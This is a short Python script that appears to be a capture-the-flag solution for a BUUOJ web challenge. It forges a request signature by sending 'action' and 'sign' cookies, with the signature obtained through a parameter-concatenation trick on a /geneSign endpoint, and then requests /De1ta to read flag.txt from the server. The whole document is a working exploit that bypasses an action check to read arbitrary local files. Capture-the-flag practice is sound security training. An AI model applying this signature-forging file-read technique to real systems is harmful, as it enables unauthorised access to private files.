import requests

url = "http://9d01de5b-643c-4086-a8c8-4d449795ffac.node5.buuoj.cn:81"

sign = "f3f82e69b10183a4ee593b3cd50cca9e"

# sign = requests.get(url + "/geneSign?param=flag.txtread").text

cookies = {
    'action': 'readscan',
    'sign': sign,
}

resp = requests.get(url + "/De1ta?param=flag.txt", cookies = cookies)

print(resp.text)